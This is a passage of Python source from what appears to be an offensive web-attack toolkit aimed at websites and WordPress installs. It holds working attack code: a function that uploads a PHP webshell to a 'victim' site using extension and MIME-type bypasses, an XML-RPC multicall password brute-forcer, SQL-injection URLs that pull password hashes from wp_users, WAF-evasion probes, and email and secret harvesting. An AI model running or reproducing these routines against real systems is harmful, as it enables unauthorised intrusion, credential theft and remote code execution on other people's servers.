        _found_box("RACE CONDITION", base,
                   "No race condition detected", found=False)

    _result_box("RACE CONDITION",[
        f"{DIM}Concurrent requests: {n_threads}{RST}",
        f"{'[RED]' if results else '[GRN]'}"
        f"Successful: {len(success_codes)}{RST}",
    ])
    _pause()
    return results


                                                                                 
               
                                                                                 

def idor_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"IDOR Scanner → {base}")

    api_patterns = [
        "/api/v1/users/{id}",
        "/api/v1/orders/{id}",
        "/api/v1/profile/{id}",
        "/api/v1/accounts/{id}",
        "/api/users/{id}",
        "/user/{id}",
        "/account/{id}",
        "/order/{id}",
        "/profile/{id}",
        "/document/{id}",
        "/file/{id}",
        "/invoice/{id}",
    ]

    results  = []
    prev_body = {}
    test_ids  = list(range(1, 11)) + [100, 999, 1000, 9999, 99999]

    for pattern in api_patterns:
        responses_seen = {}
        for obj_id in test_ids[:6]:
            path = pattern.replace("{id}", str(obj_id))
            try:
                r = _get(base + path)
                if r and r.status_code == 200:
                    size = len(r.content)
                    if size not in responses_seen:
                        responses_seen[size] = []
                    responses_seen[size].append({"id": obj_id, "path": path,
                                                  "size": size})
                    sensitive_sigs = [
                        "email","password","phone","credit","ssn",
                        "address","dob","token","key","secret",
                    ]
                    if any(s in r.text.lower() for s in sensitive_sigs):
                        results.append({"pattern": pattern, "id": obj_id,
                                        "path": base+path})
                        _vuln(f"IDOR: sensitive data in {path}")
                        _add_finding(
                            "HIGH","IDOR — Sensitive Data Exposure",base+path,
                            f"Object ID {obj_id} returns sensitive data without auth check",
                            f"GET {path} returned 200 with sensitive fields",
                            "Validate ownership on every object access.","IDOR"
                        )
            except Exception:
                pass

    if results:
        _found_box("IDOR", base,
                   "\n".join(f"[IDOR] {r['path'][:50]}"
                             for r in results[:5]), found=True)
    else:
        _clean("No IDOR detected")
        _found_box("IDOR", base, "No IDOR detected", found=False)

    _result_box("IDOR SCAN",[
        f"{RED}Candidates: {len(results)}{RST}" if results
        else f"{GRN}No IDOR candidates found{RST}"
    ])
    _pause()
    return results


                                                                                 
                         
                                                                                 

def mass_assignment_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Mass Assignment Scanner → {base}")
    results = []

    privileged_fields = [
        {"admin": True},     {"isAdmin": True},
        {"role": "admin"},   {"role": "superuser"},
        {"is_staff": True},  {"is_superuser": True},
        {"privilege": 1},    {"level": 9},
        {"verified": True},  {"approved": True},
        {"banned": False},   {"active": True},
        {"balance": 99999},  {"credits": 99999},
    ]

    endpoints = [
        "/api/v1/users/me", "/api/users/me", "/api/profile",
        "/api/v1/profile", "/api/account", "/api/v1/account",
        "/api/register", "/api/v1/register", "/api/signup",
    ]

    for endpoint in endpoints:
        for payload in privileged_fields:
            try:
                r = _sess().patch(
                    base + endpoint,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=TIMEOUT, verify=VERIFY_SSL,
                )
                if r and r.status_code in (200, 201):
                    resp_body = r.text.lower()
                    for k, v in payload.items():
                        if k in resp_body and str(v).lower() in resp_body:
                            results.append({"endpoint": endpoint,
                                            "payload": payload,
                                            "status": r.status_code})
                            _vuln(f"Mass assignment: {endpoint}  {payload}")
                            _add_finding(
                                "HIGH","Mass Assignment",base+endpoint,
                                f"Privileged field accepted: {payload}",
                                f"PATCH {endpoint} with {payload}",
                                "Whitelist allowed fields. Ignore extra fields.","Auth"
                            )
                            break
            except Exception:
                pass

    if results:
        _found_box("MASS ASSIGNMENT", base,
                   "\n".join(f"[MA] {r['endpoint']}"
                             for r in results[:5]), found=True)
    else:
        _clean("No mass assignment detected")
        _found_box("MASS ASSIGNMENT", base,
                   "No mass assignment detected", found=False)

    _result_box("MASS ASSIGNMENT",[
        f"{RED}Issues: {len(results)}{RST}" if results
        else f"{GRN}No mass assignment detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                              
                                                                                 

def http_method_override(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"HTTP Method Override → {base}")
    results = []

    override_headers = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
        "_method",
    ]
    test_methods = ["DELETE","PUT","PATCH","TRACE","OPTIONS","CONNECT","PROPFIND"]
    test_paths   = ["/api/users/1", "/api/v1/users/1", "/admin/users/1",
                    "/api/settings", "/api/config"]

    for path in test_paths:
        for method in test_methods:
            for hdr in override_headers:
                try:
                    r = _post(
                        base + path,
                        headers={hdr: method,
                                 "Content-Type": "application/json"},
                        data="{}",
                    )
                    if r and r.status_code not in (400, 404, 403):
                        results.append({"path": path, "method": method,
                                        "override_header": hdr,
                                        "status": r.status_code})
                        _warn(f"Method override: POST+{hdr}:{method}  "
                              f"→ {path}  [{r.status_code}]")
                        _add_finding(
                            "MEDIUM","HTTP Method Override",base+path,
                            f"POST with {hdr}:{method} accepted",
                            f"Header: {hdr}: {method}",
                            "Validate method on server-side. Ignore override headers.","Auth"
                        )
                except Exception:
                    pass

    if results:
        _found_box("HTTP METHOD OVERRIDE", base,
                   "\n".join(f"[{r['method']}] {r['path']}"
                             for r in results[:5]), found=True)
    else:
        _clean("No method override bypass detected")
        _found_box("HTTP METHOD OVERRIDE", base,
                   "No method override bypass detected", found=False)

    _result_box("METHOD OVERRIDE",[
        f"{RED}Bypasses: {len(results)}{RST}" if results
        else f"{GRN}No method override bypass{RST}"
    ])
    _pause()
    return results


                                                                                 
                        
                                                                                 

def ldap_injection_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"LDAP Injection Scanner → {base}")
    results = []
    params  = ["username","user","login","email","search","q","name","cn","uid"]

    error_sigs = [
        "ldap_bind","ldap error","filter error","invalid filter",
        "bad filter","search_s failed","ldap://","ldaps://",
        "javax.naming","dsid-","dsid-0c09044","winbind","slapd",
    ]

    for param in params:
        for payload in LDAP_INJECTION_PAYLOADS:
            try:
                r = _get(f"{base}/?{param}={quote(payload)}")
                if r:
                    body = r.text.lower()
                    if any(sig in body for sig in error_sigs):
                        results.append({"param": param, "payload": payload})
                        _vuln(f"LDAP injection: {param}={payload}")
                        _add_finding(
                            "HIGH","LDAP Injection",f"{base}/?{param}=",
                            f"LDAP error in response for param {param}",
                            f"Payload: {payload}",
                            "Escape LDAP special chars. Use parameterized LDAP.","LDAP"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        _found_box("LDAP INJECTION", base,
                   "\n".join(f"[LDAP] {r['param']}={r['payload'][:40]}"
                             for r in results[:5]), found=True)
    else:
        _clean("No LDAP injection detected")
        _found_box("LDAP INJECTION", base,
                   "No LDAP injection detected", found=False)

    _result_box("LDAP INJECTION",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No LDAP injection detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                         
                                                                                 

def xpath_injection_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"XPath Injection Scanner → {base}")
    results = []
    params  = ["username","user","search","q","name","id","xpath","query"]

    error_sigs = [
        "xpath","xmlquery","xquery","xmldb",
        "expression must evaluate","unexpected token",
        "unterminated string","invalid expression",
        "org.xml","javax.xml","com.saxonica",
    ]

    for param in params:
        for payload in XPATH_INJECTION_PAYLOADS:
            try:
                r = _get(f"{base}/?{param}={quote(payload)}")
                if r:
                    body = r.text.lower()
                    if any(sig in body for sig in error_sigs):
                        results.append({"param": param, "payload": payload})
                        _vuln(f"XPath injection: {param}={payload}")
                        _add_finding(
                            "HIGH","XPath Injection",f"{base}/?{param}=",
                            f"XPath error in response",
                            f"Payload: {payload}",
                            "Parameterize XPath queries.","XPath"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        _found_box("XPATH INJECTION", base,
                   "\n".join(f"[XPath] {r['param']}"
                             for r in results[:5]), found=True)
    else:
        _clean("No XPath injection detected")
        _found_box("XPATH INJECTION", base,
                   "No XPath injection detected", found=False)

    _result_box("XPATH INJECTION",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No XPath injection detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                               
                                                                                 

def s3_bucket_enum(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    host    = urlparse(base).hostname
    parts   = host.split(".")
    org_name = parts[0] if parts else host
    _info(f"S3 Bucket Enumeration → {org_name}")
    results  = []

    bucket_names = [
        p.replace("{target}", org_name)
        for p in S3_BUCKET_PATTERNS
    ]

    for bucket in bucket_names:
        s3_urls = [
            f"https://{bucket}.s3.amazonaws.com/",
            f"https://s3.amazonaws.com/{bucket}/",
            f"https://{bucket}.s3.us-east-1.amazonaws.com/",
        ]
        for s3_url in s3_urls:
            try:
                r = _get(s3_url, allow_redirects=True)
                if r:
                    if r.status_code == 200:
                        if "ListBucketResult" in r.text or "<Key>" in r.text:
                            results.append({"bucket": bucket, "url": s3_url,
                                            "open": True})
                            _vuln(f"OPEN S3 BUCKET: {s3_url}")
                            _add_finding(
                                "CRITICAL","Open S3 Bucket",s3_url,
                                f"S3 bucket {bucket} allows public listing",
                                s3_url,
                                "Set bucket to private. Review IAM policies.","Cloud"
                            )
                    elif r.status_code == 403:
                        results.append({"bucket": bucket, "url": s3_url,
                                        "open": False, "exists": True})
                        _found(f"S3 bucket exists (private): {bucket}")
                    elif "NoSuchBucket" not in r.text:
                        results.append({"bucket": bucket, "url": s3_url,
                                        "status": r.status_code})
            except Exception:
                pass

    if results:
        open_buckets = [r for r in results if r.get("open")]
        if open_buckets:
            _found_box("S3 BUCKET EXPOSURE", base,
                       "\n".join(r['url'] for r in open_buckets[:5]), found=True)
        else:
            _found_box("S3 BUCKETS (PRIVATE)", base,
                       "\n".join(r['bucket'] for r in results[:5]), found=True)
    else:
        _clean("No S3 buckets found")
        _found_box("S3 ENUMERATION", base,
                   "No S3 buckets found for this organization", found=False)

    _result_box("S3 BUCKET ENUM",[
        f"{RED}Open buckets: {sum(1 for r in results if r.get('open'))}{RST}",
        f"{YLW}Total found: {len(results)}{RST}",
    ])
    _pause()
    return results


                                                                                 
                          
                                                                                 

def session_fixation_check(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {"vulnerable": False}
    try:
        r1 = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        pre_cookies = dict(sess.cookies)
        r2 = sess.get(base + "/login", timeout=timeout, verify=VERIFY_SSL)
        post_cookies = dict(sess.cookies)
        if pre_cookies == post_cookies and pre_cookies:
            result["vulnerable"] = True
            result["cookies"] = list(pre_cookies.keys())
    except Exception:
        pass
    return result

def file_write_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    write_paths = [
        "/api/v1/write", "/api/upload", "/api/files",
        "/file/write", "/admin/write",
    ]
    for path in write_paths:
        try:
            r = sess.put(base + path,
                         data=b"syke_test_write",
                         timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code in (200,201):
                results.append({"path": base+path, "status": r.status_code})
        except Exception:
            pass
    return results

def check_mu_plugins(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    for path in WP_MUST_USE_PLUGIN_PATHS:
        try:
            r = sess.get(base + path, timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code == 200 and len(r.content) > 0:
                found.append({"path": base+path, "size": len(r.content)})
        except Exception:
            pass
    return found

def multisite_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    for path in MULTISITE_PATHS:
        try:
            r = sess.get(base + path, timeout=timeout,
                         verify=VERIFY_SSL, allow_redirects=False)
            if r and r.status_code in (200,302):
                found.append({"path": base+path, "status": r.status_code})
        except Exception:
            pass
    return found

def waf_evasion_test(sess, base):
    results = []
    for hdrs in WAF_EVASION_HEADERS:
        try:
            r = sess.get(
                base + "/wp-admin/",
                headers=hdrs,
                timeout=TIMEOUT, verify=VERIFY_SSL,
                allow_redirects=False,
            )
            if r:
                results.append({"headers": hdrs, "status": r.status_code})
        except Exception:
            pass
    return results

def cron_trigger_abuse(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {}
    try:
        t0 = time.time()
        r  = sess.get(base + "/wp-cron.php", timeout=timeout, verify=VERIFY_SSL)
        elapsed = time.time() - t0
        result["time"] = round(elapsed, 2)
        result["status"] = r.status_code if r else None
        result["dos_risk"] = elapsed > 10
    except Exception:
        result["time"] = None
    return result

def scan_wp_db_prefix(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    for payload in ["' OR EXISTS(SELECT * FROM wp_users)--",
                    "' OR EXISTS(SELECT * FROM wptests_users)--"]:
        try:
            r = sess.get(f"{base}/?s={quote(payload)}",
                         timeout=timeout, verify=VERIFY_SSL)
            if r and "wp_users" in r.text:
                return "wp_"
            if r and "wptests_users" in r.text:
                return "wptests_"
        except Exception:
            pass
    return "wp_"

def scan_interesting_files(sess, base, depth=1, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    interesting_ext = [".bak",".sql",".zip",".tar.gz",".log",".old",
                       ".orig",".save","~",".swp",".DS_Store"]
    results = []
    try:
        r = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        if r:
            files = re.findall(r'href=["\']([^"\']+)["\']', r.text)
            for f in files[:100]:
                for ext in interesting_ext:
                    if f.endswith(ext):
                        full = f if f.startswith("http") else urljoin(base, f)
                        try:
                            r2 = sess.get(full, timeout=5, verify=VERIFY_SSL)
                            if r2 and r2.status_code == 200:
                                results.append({"url": full, "ext": ext,
                                                "size": len(r2.content)})
                        except Exception:
                            pass
    except Exception:
        pass
    return results


                                                                                 
                         
                                                                                 

def _find_webshell_in_downloads(shell_name: str) -> bytes:
    """
    Searches common download directories for the named webshell file.
    Returns file bytes or None.
    """
    search_dirs = [
        os.path.expanduser("~/Downloads"),
        "/storage/emulated/0/Download",
        "/sdcard/Download",
        "/tmp",
        os.getcwd(),
        os.path.expanduser("~"),
    ]
    for d in search_dirs:
        candidate = os.path.join(d, shell_name)
        if os.path.exists(candidate):
            with open(candidate, "rb") as f:
                return f.read()
    return None

def auto_webshell_upload(target=None):
    """
    Automatically uploads a webshell to any upload-enabled web form.
    Asks for the target URL and shell filename, then attempts all
    common upload bypasses.
    """
    _banner()
    if not target:
        target = _ask("upload-target-url (e.g. https://victim.com)")
    if not target:
        _pause()
        return []
    base = normalize_base(target)
    ok_, url, _ = check_host(base)
    if not ok_:
        _err(f"Cannot reach: {base}")
        _pause()
        return []

    _info(f"Webshell Uploader → {base}")

    shell_name = _ask("webshell-filename (from Downloads, e.g. shell.php)")
    if not shell_name:
        _warn("Using built-in minimal webshell")
        shell_bytes = SHELL_PAYLOADS[0]
        shell_name  = "shell.php"
    else:
        shell_bytes = _find_webshell_in_downloads(shell_name)
        if not shell_bytes:
            _err(f"Shell not found in any Downloads directory: {shell_name}")
            _warn("Using built-in minimal webshell instead")
            shell_bytes = SHELL_PAYLOADS[0]
            shell_name  = "shell.php"
        else:
            _clean(f"Shell found: {shell_name}  ({len(shell_bytes)} bytes)")

    upload_paths = [
        "/upload", "/upload.php", "/uploads", "/upload/",
        "/api/upload", "/api/v1/upload", "/file/upload",
        "/media/upload", "/image/upload", "/img/upload",
        "/wp-admin/async-upload.php",
        "/wp-admin/admin-ajax.php",
        "/wp-content/uploads/",
        "/admin/upload.php", "/admin/uploads",
        "/filemanager/upload", "/elfinder/upload",
        "/kcfinder/upload",
    ]

    results        = []
    base_name      = os.path.splitext(shell_name)[0]
    mime_types     = ["image/jpeg","image/png","image/gif","application/pdf"]
    ext_bypasses   = [".php", ".php5", ".phtml", ".php.jpg",
                     ".php%00.jpg", ".pHp", ".PHP"]

    for upload_path in upload_paths:
        url_full = base + upload_path
        for ext in ext_bypasses:
            try_name = base_name + ext
            for mime in mime_types:
                try:
                    files = {
                        "file":  (try_name, shell_bytes, mime),
                        "image": (try_name, shell_bytes, mime),
                        "upload":(try_name, shell_bytes, mime),
                        "photo": (try_name, shell_bytes, mime),
                    }
                    for field_name, file_tuple in list(files.items())[:2]:
                        try:
                            r = requests.post(
                                url_full,
                                files={field_name: file_tuple},
                                timeout=TIMEOUT,
                                verify=VERIFY_SSL,
                                allow_redirects=True,
                            )
                            if r and r.status_code in (200, 201):
                                body = r.text
                                upload_sigs = [
                                    try_name.split("/")[-1],
                                    "success","uploaded","file saved",
                                    "upload complete","/wp-content/uploads/",
                                ]
                                if any(s.lower() in body.lower()
                                       for s in upload_sigs):
                                    shell_url = ""
                                    url_match = re.search(
                                        r'(https?://[^\s"\'<>]+' +
                                        re.escape(base_name) + r'[^\s"\'<>]*)',
                                        body, re.I
                                    )
                                    if url_match:
                                        shell_url = url_match.group(1)
                                    results.append({
                                        "upload_path": upload_path,
                                        "filename":    try_name,
                                        "mime":        mime,
                                        "shell_url":   shell_url,
                                        "field":       field_name,
                                    })
                                    _vuln(f"UPLOAD SUCCESS: {upload_path}  "
                                          f"file={try_name}  "
                                          f"shell={shell_url or '?'}")
                                    _add_finding(
                                        "CRITICAL","Webshell Upload",url_full,
                                        f"PHP webshell uploaded as {try_name}",
                                        f"Upload path: {upload_path}  "
                                        f"Shell URL: {shell_url}",
                                        "Validate file type server-side. "
                                        "Store uploads outside webroot.","RCE"
                                    )
                                    detail = (
                                        f"Path: {upload_path}\n"
                                        f"File: {try_name}\n"
                                        f"Shell: {shell_url or 'check manually'}"
                                    )
                                    _found_box("WEBSHELL UPLOAD", base,
                                               detail, found=True)
                        except Exception:
                            pass
                except Exception:
                    pass

    if not results:
        _clean("No successful shell upload detected")
        _found_box("WEBSHELL UPLOAD", base,
                   "No upload endpoints accepted the shell", found=False)

    _result_box("WEBSHELL UPLOADER",[
        f"{RED}Successful uploads: {len(results)}{RST}" if results
        else f"{GRN}No successful uploads{RST}",
        *([f"{GRN}Shell URL:{RST} {r['shell_url'] or '?'}"
           for r in results[:3]] if results else []),
    ])

    if results:
        for r in results:
            _save_results(
                base, r.get("shell_url",""),
                {"user": "shell", "pass": r["filename"]},
                extra=r,
            )

    _pause()
    return results


                                                                                 
                       
                                                                                 

def enumerate_users(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    users   = []
    sources = [
        base + "/wp-json/wp/v2/users",
        base + "/wp-json/wp/v2/users?per_page=100",
        base + "/?author=1",
        base + "/?author=2",
        base + "/?author=3",
    ]
    for src in sources:
        try:
            r = sess.get(src, timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    if isinstance(data, list):
                        for u in data:
                            login = u.get("slug") or u.get("name","")
                            if login and login not in [x.get("login") for x in users]:
                                users.append({
                                    "login": login,
                                    "id":    u.get("id"),
                                    "name":  u.get("name",""),
                                    "email": u.get("email",""),
                                })
                except Exception:
                    m = re.search(r'author/([a-zA-Z0-9_\-\.]+)', r.url or "")
                    if m and m.group(1) not in [x.get("login") for x in users]:
                        users.append({"login": m.group(1), "id": None})
        except Exception:
            pass
    return users

def enumerate_plugins(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    def _chk(plugin):
        try:
            r = sess.get(
                f"{base}/wp-content/plugins/{plugin}/",
                timeout=timeout, verify=VERIFY_SSL,
                allow_redirects=False,
            )
            if r and r.status_code in (200,403):
                found.append({
                    "plugin": plugin,
                    "status": r.status_code,
                    "url":    f"{base}/wp-content/plugins/{plugin}/",
                })
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(_chk, WP_PLUGINS_TOP)
    return found

def enumerate_themes(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    def _chk(theme):
        try:
            r = sess.get(
                f"{base}/wp-content/themes/{theme}/",
                timeout=timeout, verify=VERIFY_SSL,
                allow_redirects=False,
            )
            if r and r.status_code in (200,403):
                found.append({
                    "theme":  theme,
                    "status": r.status_code,
                    "url":    f"{base}/wp-content/themes/{theme}/",
                })
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(_chk, WP_THEMES_TOP)
    return found

def wp_version_check_vuln(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {}
    try:
        r = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        if r:
            m = WP_VER_RES.search(r.text)
            if m:
                ver = next((v for v in m.groups() if v), None)
                if ver:
                    result["version"] = ver
                    if ver in WORDPRESS_KNOWN_VULNS:
                        vuln = WORDPRESS_KNOWN_VULNS[ver]
                        result["cve"]  = vuln[0]
                        result["desc"] = vuln[1]
    except Exception:
        pass
    return result

def xmlrpc_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {"enabled": False}
    try:
        r = sess.post(
            base + "/xmlrpc.php",
            data=XMLRPC_PAYLOADS["list_methods"],
            headers={"Content-Type": "text/xml"},
            timeout=timeout, verify=VERIFY_SSL,
        )
        if r and r.status_code == 200 and "<methodResponse>" in r.text:
            result["enabled"] = True
            methods = re.findall(r'<string>([\w.]+)</string>', r.text)
            result["methods"] = methods[:20]
    except Exception:
        pass
    return result

def xmlrpc_bruteforce(sess, base, username, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {"cracked": False}
    multicall_payload = (
        "<?xml version='1.0' encoding='utf-8'?>"
        "<methodCall><methodName>system.multicall</methodName>"
        "<params><param><value><array><data>"
    )
    for pwd in COMMON_PASSWORDS[:20]:
        login_xml = (
            "<value><struct>"
            "<member><name>methodName</name>"
            "<value><string>wp.getAuthors</string></value></member>"
            "<member><name>params</name><value><array><data>"
            f"<value><int>1</int></value>"
            f"<value><string>{username}</string></value>"
            f"<value><string>{pwd}</string></value>"
            "</data></array></value></member>"
            "</struct></value>"
        )
        multicall_payload += login_xml
    multicall_payload += (
        "</data></array></value></param></params></methodCall>"
    )
    try:
        r = sess.post(
            base + "/xmlrpc.php",
            data=multicall_payload,
            headers={"Content-Type": "text/xml"},
            timeout=timeout, verify=VERIFY_SSL,
        )
        if r and "isAdmin" in r.text:
            idx = r.text.find("isAdmin")
            context = r.text[max(0,idx-100):idx+100]
            for pwd in COMMON_PASSWORDS[:20]:
                if pwd in context:
                    result["cracked"] = True
                    result["password"] = pwd
                    break
    except Exception:
        pass
    return result

def extract_wp_hashes(sess, base):
    results = []
    sqli_tests = [
        f"{base}/?s=-1' UNION SELECT 1,user_pass,3 FROM wp_users--",
        f"{base}/?id=-1 UNION SELECT user_login,user_pass FROM wp_users--",
    ]
    for test in sqli_tests:
        try:
            r = sess.get(test, timeout=TIMEOUT, verify=VERIFY_SSL)
            if r:
                hashes = re.findall(r'\$P\$[./0-9A-Za-z]{31}', r.text)
                for h in hashes:
                    results.append({"hash": h})
        except Exception:
            pass
    return results

def check_all_plugin_vulns(sess, base, plugins, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for plugin_info in plugins:
        plugin = plugin_info.get("plugin","")
        if plugin in WP_PLUGIN_VULN_SIGNATURES:
            sigs = WP_PLUGIN_VULN_SIGNATURES[plugin]
            try:
                r = sess.get(
                    f"{base}/wp-content/plugins/{plugin}/readme.txt",
                    timeout=timeout, verify=VERIFY_SSL,
                )
                if r and r.status_code == 200:
                    for sig in sigs:
                        if sig.lower() in r.text.lower():
                            results.append({"plugin": plugin, "sig": sig})
            except Exception:
                pass
    return results

WP_PLUGIN_VULN_SIGNATURES = {
    "revslider":           ["revslider <= 4.2","TimThumb"],
    "wp-super-cache":      ["wp-super-cache 1.x"],
    "all-in-one-seo-pack": ["all in one seo pack <= 2.2.6"],
    "w3-total-cache":      ["w3tc","w3 total cache"],
    "contact-form-7":      ["CF7 CSRF"],
    "gravityforms":        ["gravityforms sql"],
    "wordfence":           ["wordfence bypass"],
    "woocommerce":         ["woocommerce arbitrary file"],
    "wp-file-manager":     ["elFinderVolume","wp-file-manager"],
}

def run_all_cves(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    ver_info = wp_version_check_vuln(sess, base, timeout)
    if ver_info.get("cve"):
        results.append({
            "cve":  ver_info["cve"],
            "desc": ver_info["desc"],
            "ver":  ver_info.get("version","?"),
        })
    return results

def generate_summary_report(base, scan_results):
    total_vulns = sum([
        len(scan_results.get("sqli",[])),
        len(scan_results.get("lfi",[])),
        len(scan_results.get("ssrf",[])),
        len(scan_results.get("xss",[])),
        len(scan_results.get("ssti",[])),
        len(scan_results.get("nosql",[])),
    ])
    lines = [
        f"{GRN}Target:{RST} {base}",
        f"{GRN}Users:{RST} {len(scan_results.get('users',[]))}",
        f"{GRN}Plugins:{RST} {len(scan_results.get('plugins',[]))}",
        f"{RED}Vulnerabilities:{RST} {total_vulns}",
        f"{GRN}WAF:{RST} {scan_results.get('waf',{}).get('type','none')}",
    ]
    _result_box("SCAN SUMMARY", lines)


                                                                                 
                  
                                                                                 

def email_harvester(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base   = normalize_base(url)
    _info(f"Email Harvester → {base}")
    emails = set()
    pages  = [
        base+"/", base+"/about", base+"/contact",
        base+"/team", base+"/staff", base+"/support",
        base+"/about-us", base+"/contact-us",
    ]
    for page in pages:
        try:
            r = _get(page)
            if r and r.ok:
                found_here = re.findall(
                    r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
                    _html_mod.unescape(r.text)
                )
                for e in found_here:
                    if not re.search(r'\.(png|jpg|gif|svg|js|css|php)$',
                                     e, re.I):
                        emails.add(e.lower())
                        _found(f"Email: {e}")
        except Exception:
            pass

    if emails:
        _add_finding("INFO","Email Addresses Found",base,
                     f"{len(emails)} email(s) harvested","HTML source",
                     "Avoid exposing contact emails directly.","OSINT")
        _result_box("EMAILS FOUND",
                    [f"{GRN}{e}{RST}" for e in sorted(emails)[:40]])
    else:
        _clean("No email addresses found")
    _pause()
    return sorted(emails)

def extract_emails(sess, base, depth=1, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    emails = set()
    try:
        for page in [base+"/", base+"/contact", base+"/about"]:
            try:
                r = sess.get(page, timeout=timeout, verify=VERIFY_SSL)
                if r and r.ok:
                    for e in re.findall(
                        r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
                        _html_mod.unescape(r.text)
                    ):
                        if not re.search(r'\.(png|jpg|gif|svg|js|css)$',
                                         e, re.I):
                            emails.add(e.lower())
            except Exception:
                pass
    except Exception:
        pass
    return sorted(emails)


                                                                                 
                      
                                                                                 

def js_analyzer(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base     = normalize_base(url)
    _info(f"JavaScript Analyzer → {base}")
    findings = []
    try:
        r      = _get(base + "/")
        if not r:
            _pause()
            return []
        js_urls = list(dict.fromkeys(
            re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        ))
        _info(f"Found {len(js_urls)} JS files")
        for js_url in js_urls[:25]:
            full = (js_url if js_url.startswith("http")
                    else urljoin(base, js_url))
            try:
                rj = _get(full)
                if not rj or not rj.ok:
                    continue
                content = rj.text
                for pat, label in SECRET_PATTERNS:
                    matches = pat.findall(content)
                    for m in matches[:2]:
                        val = m if isinstance(m, str) else m[-1]
                        if len(val) > 8:
                            _vuln(f"JS Secret [{label}]: {val[:50]}"
                                  f"  in {full[:60]}")
                            findings.append({
                                "file":  full,
                                "type":  label,
                                "value": val[:50],
                            })
                            _add_finding(
                                "HIGH","Secret in JavaScript",full,
                                f"{label} found in JS","JS file",
                                "Remove secrets from client-side code.","JavaScript"
                            )
                api_paths = re.findall(
                    r'["\']/(api/|v\d+/|rest/)[^"\']{3,60}["\']', content
                )
                for ap in api_paths[:5]:
                    _found(f"API path in JS: /{ap}")
                endpoints = re.findall(
                    r'(?:fetch|axios|xhr\.open|http\.get|http\.post)'
                    r'\(["\']([^"\']+)["\']',
                    content,
                )
                for ep in endpoints[:10]:
                    _found(f"Endpoint: {ep}")
            except Exception:
                pass
    except Exception as e:
        _err(f"JS analyzer error: {e}")
    _result_box("JS ANALYZER",[
        f"{GRN}JS files checked: {len(js_urls[:25])}{RST}",
        f"{RED}Secrets found: {len(findings)}{RST}",
    ])
    _pause()
    return findings

def find_exposed_secrets(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    found = []
    paths = [
        "/.env","/.env.bak","/.env.backup","/config.php",
        "/wp-config.php","/configuration.php","/settings.py",
        "/application.properties","/config/database.yml",
        "/config/secrets.yml","/storage/logs/laravel.log",
        "/debug.log","/error_log",
    ]
    for path in paths:
        try:
            r = sess.get(base + path, timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code == 200 and len(r.content) > 50:
                for pat, label in SECRET_PATTERNS:
                    if pat.search(r.text):
                        found.append({"path": base+path, "type": label})
                        break
        except Exception:
            pass
    return found


                                                                                 
               
                                                                                 

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
    143, 443, 445, 993, 995, 1723, 3306, 3389,
    5900, 6379, 8080, 8443, 8888, 9200, 9300,
    27017, 28017, 5432, 5984, 11211, 2375, 2376,
    4848, 7001, 7002, 8161, 61616, 50000, 50070,
    4444, 4445, 5555, 6666, 7777, 9090, 9999,
    1433, 1521, 49152, 49153, 49154, 49155,
    8009, 8010, 8081, 8082, 8083, 8084, 8085,
    2181, 9092, 4001, 2379, 2380, 6000, 6001,
    873, 512, 513, 514, 8500, 8600, 8300,
